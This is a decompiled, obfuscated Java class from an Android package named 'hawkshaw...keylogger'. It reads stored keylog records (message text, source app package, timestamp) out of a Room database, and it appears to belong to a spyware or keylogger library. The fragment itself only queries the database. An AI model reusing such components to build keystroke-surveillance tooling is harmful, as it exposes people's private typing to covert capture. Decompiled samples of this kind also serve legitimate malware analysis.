package com.hawkshaw.library.datalayer.room.keylogger;

import android.database.Cursor;
import androidx.room.A;
import androidx.room.D;
import java.util.ArrayList;
import java.util.concurrent.Callable;
import o.C0769d;
import t3.F;

public final class a implements Callable {

    /* renamed from: a  reason: collision with root package name */
    public final /* synthetic */ D f4940a;

    /* renamed from: b  reason: collision with root package name */
    public final /* synthetic */ KeyLoggerDao_Impl f4941b;

    public a(KeyLoggerDao_Impl keyLoggerDao_Impl, D d5) {
        this.f4941b = keyLoggerDao_Impl;
        this.f4940a = d5;
    }

    public final Object call() {
        KeyLoggerDao_Impl keyLoggerDao_Impl = this.f4941b;
        A a5 = keyLoggerDao_Impl.__db;
        D d5 = this.f4940a;
        Cursor T4 = C0769d.T(a5, d5);
        try {
            int r4 = F.r(T4, "type");
            int r5 = F.r(T4, "message");
            int r6 = F.r(T4, "package_name");
            int r7 = F.r(T4, "timestamp");
            int r8 = F.r(T4, "id");
            ArrayList arrayList = new ArrayList(T4.getCount());
            while (T4.moveToNext()) {
                KeyLogEntity keyLogEntity = new KeyLogEntity(keyLoggerDao_Impl.__Type_stringToEnum(T4.getString(r4)), T4.getString(r5), T4.getString(r6), T4.getLong(r7));
                keyLogEntity.setId(T4.getInt(r8));
                arrayList.add(keyLogEntity);
            }
            return arrayList;
        } finally {
            T4.close();
            d5.f();
        }
    }
}
